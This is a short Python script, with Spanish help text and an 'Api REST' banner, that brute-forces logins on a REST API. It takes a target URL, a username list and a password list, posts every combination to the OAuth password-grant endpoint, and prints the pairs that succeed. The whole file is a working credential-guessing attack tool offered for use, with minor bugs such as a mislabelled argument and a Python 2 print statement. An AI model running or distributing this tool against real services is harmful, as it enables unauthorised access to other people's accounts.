import sys
import os
import requests
import json
import argparse
from colored import bg,fg,attr

parser = argparse.ArgumentParser('Intenta autenticarse en servicios rest, por medio de Diccionarios')
parser.add_argument('-d','--dominio', help='Direccion URL del dominio objetivo')
parser.add_argument('-u','--usuarios', help='Ubicacion del archivo de usuarios')
parser.add_argument('-c','--claves', help='Ubicacion del archivo de usuarios')

args = parser.parse_args()
def iniciar():
  fu = open(args.usuarios,'r')
  fp = open(args.claves,'r')
  usuarios = fu.readlines()
  claves = fp.readlines()
  for u in usuarios:
     for c in claves:
        #print ('%s - %s' % (u.replace('\n',''),c.replace('\n','')))
        autenticar(u.replace('\n',''),c.replace('\n',''))


def autenticar(usuario, clave):
  url = args.dominio
  payload = {'username':usuario,'password':clave,'grant_type':'password'}
  response = requests.post(url, data=payload)
  if response.ok:
     print('%s %s - %s [Exitoso] %s' % (fg(171),usuario, clave, attr('reset')))
  else:
     print('%s %s - %s [Fallido] %s' % (fg(202),usuario,clave,attr('reset')))


os.system('clear')
print("""

  ___        _  ______ _____ _____ _____ 
 / _ \      (_) | ___ \  ___/  ___|_   _|
/ /_\ \_ __  _  | |_/ / |__ \ `--.  | |  
|  _  | '_ \| | |    /|  __| `--. \ | |  
| | | | |_) | | | |\ \| |___/\__/ / | |  
\_| |_/ .__/|_| \_| \_\____/\____/  \_/  
      | |                                
      |_|                                

""")

if args.dominio is None or args.usuarios is None or args.claves is None:
  print parser.print_help()

else:
  iniciar()
